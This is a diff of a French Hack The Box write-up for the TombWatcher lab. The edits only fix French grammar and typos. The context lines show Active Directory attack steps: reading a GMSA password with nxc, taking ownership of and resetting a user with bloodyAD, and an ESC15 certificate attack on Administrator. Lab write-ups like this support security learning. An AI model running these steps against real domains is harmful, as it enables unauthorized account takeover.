@@ -113,7 +113,7 @@ bloodyAD --host dc01.tombwatcher.htb -d tombwatcher.htb -u alfred -p basketball 
 
 ### Compromission de ansible_dev$
 
-Le groupe infrastructure (et donc maintenant, Alfred) peut lire le mot de passe GMSA de ansible dev. Nous pouvons donc récupérer le hash NTLM de ansible_dev$ pour se connecter avec ce compte.
+Le groupe infrastructure (et donc maintenant, Alfred) peut lire le mot de passe GMSA d'ansible dev. Nous pouvons donc récupérer le hash NTLM de ansible_dev$ pour se connecter avec ce compte.
 
 ```bash
 sudo nxc ldap dc01.tombwatcher.htb -u alfred -p basketball --gmsa
@@ -138,7 +138,7 @@ CHANGE-P... 10.129.232.167  445    DC01             [+] Successfully changed pas
 
 ### Compromission de John 
 
-Avec l'utilisateur Sam, nous allons changer le owner de john (pour devenir le owner), puis nous attribuer tous les droits sur l'utilisateur, avant de changer son mot de passe :
+Avec l'utilisateur Sam, nous allons changer l'owner de john (pour devenir l'owner), puis nous attribuer tous les droits sur l'utilisateur, avant de changer son mot de passe :
 
 ```bash
 bloodyAD --host dc01.tombwatcher.htb -d tombwatcher.htb -u sam -p pass123 set owner john sam
@@ -216,7 +216,7 @@ distinguishedname     : CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
 objectclass           : {top, person, organizationalPerson, user}
 ```
 
-Nous allons donc restaurer cet utilisateur, changer son mot de passe, et générer un certificat d'authentification Adminisitrator (ESC15) :
+Nous allons donc restaurer cet utilisateur, changer son mot de passe, et générer un certificat d'authentification Administrator (ESC15) :
 
 
 ```powershell
@@ -243,7 +243,7 @@ Source : https://cycrafttechnology.medium.com/esc15-ekuwu-cve-2024-49019-vulnera
 Avec notre nouvel (ancien) utilisateur ressuscité des morts, nous allons donc pouvoir suivre une attaque en plusieurs étapes décrites dans le [wiki de certipy](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation) : 
 - Demander un certificat "Agent" 
 - Avec le certificat précédent, récupérer un certificat d'authentification pour l'utilisateur Administrator 
-- Utiliser le certificat Adminisitrator pour récupérer le hash de l'utilisateur et se connecter avec lui 
+- Utiliser le certificat Administrator pour récupérer le hash de l'utilisateur et se connecter avec lui 
 
 
 ```
